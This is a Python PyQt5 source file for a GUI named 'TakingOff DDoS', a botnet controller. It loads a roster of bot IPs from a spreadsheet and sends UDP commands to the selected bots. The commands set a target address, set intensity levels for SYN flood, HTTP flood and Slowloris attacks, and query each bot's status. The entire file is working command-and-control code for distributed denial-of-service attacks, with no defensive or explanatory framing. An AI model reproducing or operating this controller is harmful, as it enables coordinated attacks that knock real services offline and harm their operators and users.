# -*- coding: utf-8 -*-
"""
Created on Fri Jun  8 16:09:45 2018

@author: DrLC
"""

from PyQt5.QtGui import *
from PyQt5.QtWidgets import *
from PyQt5 import QtCore

import sys
import pandas
import socket

from attacker_ui_mainwindow import Ui_MainWindow

class myApp(QMainWindow, Ui_MainWindow):  
    
    def __init__(self, parent=None, name=None):    
        
        super(myApp, self).__init__(parent)
        self.setFixedSize(800, 600)
        self.setupUi(self)
        self.table_init()
        self.btn_botnet_all.setEnabled(False)
        self.btn_botnet_none.setEnabled(False)
        
        port = None
        self.n_synflood = None
        self.n_httpflood = None
        self.n_slowloris = None
        self.tgt_ip = None
        self.tgt_port = None
        with open("attacker_ui.config", 'r') as f:
            for line in f.readlines():
                if line.strip()[:4].upper() == 'PORT':
                    port = int(line.strip()[4:].strip().strip("=").strip())
                elif line.strip()[:10].upper() == 'N_SYNFLOOD':
                    self.n_synflood = int(line.strip()[10:].strip().strip("=").strip())
                elif line.strip()[:11].upper() == 'N_HTTPFLOOD':
                    self.n_httpflood = int(line.strip()[11:].strip().strip("=").strip())
                elif line.strip()[:11].upper() == 'N_SLOWLORIS':
                    self.n_slowloris = int(line.strip()[11:].strip().strip("=").strip())
                elif line.strip()[:14].upper() == 'TGT_IP_DEFAULT':
                    self.tgt_ip = line.strip()[14:].strip().strip("=").strip()
                elif line.strip()[:16].upper() == 'TGT_PORT_DEFAULT':
                    self.tgt_port = int(line.strip()[16:].strip().strip("=").strip())
                else: assert False, 'Wrong configureation!'
        assert port is not None and self.n_synflood is not None \
            and self.n_httpflood is not None and self.n_slowloris is not None \
            and self.tgt_ip is not None and self.tgt_port is not None, \
            'Missing option!'
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.s.bind(('0.0.0.0', port))
        self.label_5.setText(str(self.n_synflood))
        self.label_7.setText(str(self.n_httpflood))
        self.label_9.setText(str(self.n_slowloris))
        
        self.btn_botnet_load.clicked.connect(self.btn_botnet_load_clicked)
        self.btn_botnet_all.clicked.connect(self.btn_botnet_all_clicked)
        self.btn_botnet_none.clicked.connect(self.btn_botnet_none_clicked)
        self.btn_status.clicked.connect(self.btn_status_clicked)
        self.btn_set.clicked.connect(self.btn_set_clicked)
        self.btn_target.clicked.connect(self.btn_target_clicked)
        
    def table_init(self):
        
        self.tab_botnet.setEditTriggers(QTableWidget.NoEditTriggers)
        self.tab_botnet.setColumnCount(3)
        self.tab_botnet.setHorizontalHeaderLabels(['IP', 'Port', 'Select'])
        w = self.tab_botnet.width()
        self.tab_botnet.setColumnWidth(0, w*3/8)
        self.tab_botnet.setColumnWidth(1, w*2/8)
        self.tab_botnet.setColumnWidth(2, w*2/8)
        
        self.tab_status.setEditTriggers(QTableWidget.NoEditTriggers)
        self.tab_status.setColumnCount(5)
        self.tab_status.setHorizontalHeaderLabels(['IP', 'Port', 'SF', 'HF', 'SL'])
        w = self.tab_status.width()
        self.tab_status.setColumnWidth(0, w*2/7)
        self.tab_status.setColumnWidth(1, w/6)
        self.tab_status.setColumnWidth(2, w/7)
        self.tab_status.setColumnWidth(3, w/7)
        self.tab_status.setColumnWidth(4, w/7)
        
    def btn_target_clicked(self):
        
        s,ok = QInputDialog.getText(self, "Set your target",
                                    "Target addr:", QLineEdit.Normal,
                                    self.tgt_ip+":"+str(self.tgt_port))
        s = s.strip().split(":")
        if ok:
            self.tgt_ip = s[0].strip()
            self.tgt_port = s[1].strip()
            for ip, port, btn in zip(self.botnet_ip, self.botnet_port, self.btn_botnet_radio):
                if btn.isChecked():
                    self.s.sendto(bytes('IP '+str(self.tgt_ip), encoding="utf-8"), (ip, int(port)))
                    self.s.sendto(bytes('PORT '+str(self.tgt_port), encoding="utf-8"), (ip, int(port)))
        
    def btn_set_clicked(self):
        
        tmp_min = self.slider_synflood.minimum()
        tmp_max = self.slider_synflood.maximum()
        tmp_syn = int(float(self.slider_synflood.value()-tmp_min)/float(tmp_max-tmp_min)*self.n_synflood)
        tmp_min = self.slider_httpflood.minimum()
        tmp_max = self.slider_httpflood.maximum()
        tmp_http = int(float(self.slider_httpflood.value()-tmp_min)/float(tmp_max-tmp_min)*self.n_httpflood)
        tmp_min = self.slider_slowloris.minimum()
        tmp_max = self.slider_slowloris.maximum()
        tmp_slow = int(float(self.slider_slowloris.value()-tmp_min)/float(tmp_max-tmp_min)*self.n_slowloris)
        print (tmp_syn)
        print (tmp_http)
        print (tmp_slow)
        for ip, port, btn in zip(self.botnet_ip, self.botnet_port, self.btn_botnet_radio):
            if btn.isChecked():
                try:
                    self.s.sendto(bytes('SYN '+str(tmp_syn), encoding="utf-8"), (ip, int(port)))
                    self.s.sendto(bytes('HTTP '+str(tmp_http), encoding="utf-8"), (ip, int(port)))
                    self.s.sendto(bytes('SLOW '+str(tmp_slow), encoding="utf-8"), (ip, int(port)))
                except Exception as e:
                    print (e)
                    print ("not found!")
                    continue
        
    def btn_status_clicked(self):
        
        self.tab_status.clearContents()
        cnt = 0
        for btn in self.btn_botnet_radio:
            if btn.isChecked():
                cnt += 1
        self.tab_status.setRowCount(cnt)
        for ip, port, btn, i in zip(self.botnet_ip, self.botnet_port,
                                    self.btn_botnet_radio, range(len(self.botnet_ip))):
            if btn.isChecked():
                try:
                    self.s.sendto(bytes('STATUS', encoding="utf-8"), (ip, int(port)))
                    resp, addr = self.s.recvfrom(1024)
                except Exception as e:
                    print (e)
                    print ("not found!")
                    continue
                resp = str(resp, encoding='utf-8').split()
                self.tab_status.setItem(i, 0, QTableWidgetItem(str(addr[0])))
                self.tab_status.setItem(i, 1, QTableWidgetItem(str(addr[1])))
                self.tab_status.setItem(i, 2, QTableWidgetItem(resp[1].strip()))
                self.tab_status.setItem(i, 3, QTableWidgetItem(resp[0].strip()))
                self.tab_status.setItem(i, 4, QTableWidgetItem(resp[2].strip()))
        
    def btn_botnet_all_clicked(self):
        
        for i in self.btn_botnet_radio:
            i.setChecked(True)
            
    def btn_botnet_none_clicked(self):
        
        for i in self.btn_botnet_radio:
            i.setChecked(False)
        
    def btn_botnet_load_clicked(self):
    
        botnet_path,  _ = QFileDialog.getOpenFileName(self, 'Load botnet roster', './')
        self.line_botnet_path.setText(botnet_path)
        sheet = pandas.read_excel(botnet_path)
        self.tab_botnet.clearContents()
        self.tab_botnet.setRowCount(len(sheet['ip']))
        self.btn_botnet_radio = []
        self.botnet_ip = []
        self.botnet_port = []
        for _ip, _port, i in zip(sheet['ip'], sheet['port'], range(len(sheet['ip']))):
            self.botnet_ip.append(_ip)
            self.tab_botnet.setItem(i, 0, QTableWidgetItem(_ip))
            self.botnet_port.append(str(_port))
            self.tab_botnet.setItem(i, 1, QTableWidgetItem(str(_port)))
            self.btn_botnet_radio.append(QRadioButton())
            self.tab_botnet.setCellWidget(i, 2, self.btn_botnet_radio[-1])
            self.btn_botnet_radio[-1].setChecked(True)
        self.btn_botnet_all.setEnabled(True)
        self.btn_botnet_none.setEnabled(True)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = myApp()
    window.setWindowTitle("TakingOff DDoS")
    window.show()
    sys.exit(app.exec_())